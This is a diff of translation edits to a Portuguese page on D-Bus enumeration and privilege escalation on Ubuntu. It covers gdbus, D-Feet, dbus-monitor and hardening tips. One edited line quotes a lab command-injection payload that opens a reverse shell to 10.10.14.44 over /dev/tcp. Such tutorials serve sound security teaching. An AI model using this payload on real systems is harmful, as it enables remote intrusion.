@@ -4,11 +4,11 @@
 
 ## **Enumeração GUI**
 
-O D-Bus é utilizado como o mediador de comunicações entre processos (IPC) em ambientes de desktop Ubuntu. No Ubuntu, observa-se a operação simultânea de vários barramentos de mensagens: o barramento do sistema, utilizado principalmente por **serviços privilegiados para expor serviços relevantes em todo o sistema**, e um barramento de sessão para cada usuário logado, expondo serviços relevantes apenas para aquele usuário específico. O foco aqui está principalmente no barramento do sistema devido à sua associação com serviços que operam com privilégios mais altos (por exemplo, root), já que nosso objetivo é elevar privilégios. Nota-se que a arquitetura do D-Bus emprega um 'roteador' por barramento de sessão, que é responsável por redirecionar mensagens de clientes para os serviços apropriados com base no endereço especificado pelos clientes para o serviço com o qual desejam se comunicar.
+O D-Bus é utilizado como o mediador de comunicações entre processos (IPC) em ambientes de desktop Ubuntu. No Ubuntu, a operação simultânea de vários barramentos de mensagens é observada: o barramento do sistema, utilizado principalmente por **serviços privilegiados para expor serviços relevantes em todo o sistema**, e um barramento de sessão para cada usuário logado, expondo serviços relevantes apenas para aquele usuário específico. O foco aqui está principalmente no barramento do sistema devido à sua associação com serviços que operam com privilégios mais altos (por exemplo, root), já que nosso objetivo é elevar privilégios. É notado que a arquitetura do D-Bus emprega um 'roteador' por barramento de sessão, que é responsável por redirecionar mensagens de clientes para os serviços apropriados com base no endereço especificado pelos clientes para o serviço com o qual desejam se comunicar.
 
-Os serviços no D-Bus são definidos pelos **objetos** e **interfaces** que expõem. Objetos podem ser comparados a instâncias de classe em linguagens OOP padrão, com cada instância identificada de forma única por um **caminho de objeto**. Este caminho, semelhante a um caminho de sistema de arquivos, identifica de forma única cada objeto exposto pelo serviço. Uma interface chave para fins de pesquisa é a interface **org.freedesktop.DBus.Introspectable**, que apresenta um único método, Introspect. Este método retorna uma representação XML dos métodos, sinais e propriedades suportados pelo objeto, com foco aqui nos métodos enquanto omite propriedades e sinais.
+Os serviços no D-Bus são definidos pelos **objetos** e **interfaces** que expõem. Objetos podem ser comparados a instâncias de classe em linguagens OOP padrão, com cada instância identificada de forma única por um **caminho de objeto**. Este caminho, semelhante a um caminho de sistema de arquivos, identifica de forma única cada objeto exposto pelo serviço. Uma interface chave para fins de pesquisa é a interface **org.freedesktop.DBus.Introspectable**, que apresenta um único método, Introspect. Este método retorna uma representação XML dos métodos, sinais e propriedades suportados pelo objeto, com foco aqui em métodos enquanto omite propriedades e sinais.
 
-Para comunicação com a interface D-Bus, foram empregadas duas ferramentas: uma ferramenta CLI chamada **gdbus** para fácil invocação de métodos expostos pelo D-Bus em scripts, e [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), uma ferramenta GUI baseada em Python projetada para enumerar os serviços disponíveis em cada barramento e exibir os objetos contidos em cada serviço.
+Para comunicação com a interface D-Bus, duas ferramentas foram empregadas: uma ferramenta CLI chamada **gdbus** para fácil invocação de métodos expostos pelo D-Bus em scripts, e [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), uma ferramenta GUI baseada em Python projetada para enumerar os serviços disponíveis em cada barramento e exibir os objetos contidos em cada serviço.
 ```bash
 sudo apt-get install d-feet
 ```
@@ -190,7 +190,7 @@ Você pode usar `capture` em vez de `monitor` para salvar os resultados em um ar
 
 #### Filtrando todo o ruído <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>
 
-Se houver muita informação no barramento, passe uma regra de correspondência assim:
+Se houver informações demais no barramento, passe uma regra de correspondência assim:
 ```bash
 dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
 ```
@@ -248,7 +248,7 @@ return render_template('hacker.html', title='Hacker')
 Como você pode ver, está **conectando a uma interface D-Bus** e enviando para a **função "Block"** o "client_ip".
 
 Do outro lado da conexão D-Bus, há um binário compilado em C em execução. Este código está **ouvindo** na conexão D-Bus **por endereços IP e chamando iptables via função `system`** para bloquear o endereço IP fornecido.\
-**A chamada para `system` é vulnerável intencionalmente a injeção de comando**, então um payload como o seguinte criará um shell reverso: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`
+**A chamada para `system` é vulnerável intencionalmente a injeção de comandos**, então um payload como o seguinte criará um shell reverso: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`
 
 ### Exploit it
 
@@ -488,7 +488,7 @@ Use `dbusmap --enable-probes` ou `busctl call` manual para confirmar se um patch
 ```bash
 grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
 ```
-* Exija Polkit para métodos perigosos – até mesmo proxies *root* devem passar o PID do *chamador* para `polkit_authority_check_authorization_sync()` em vez de seu próprio.
+* Exija Polkit para métodos perigosos – até mesmo proxies *root* devem passar o PID do *chamador* para `polkit_authority_check_authorization_sync()` em vez do próprio.
 * Reduza privilégios em auxiliares de longa duração (use `sd_pid_get_owner_uid()` para mudar namespaces após conectar-se ao barramento).
 * Se você não puder remover um serviço, pelo menos *escopo* para um grupo Unix dedicado e restrinja o acesso em sua política XML.
 * Blue-team: habilite a captura persistente do barramento do sistema com `busctl capture --output=/var/log/dbus_$(date +%F).pcap` e importe para o Wireshark para detecção de anomalias.
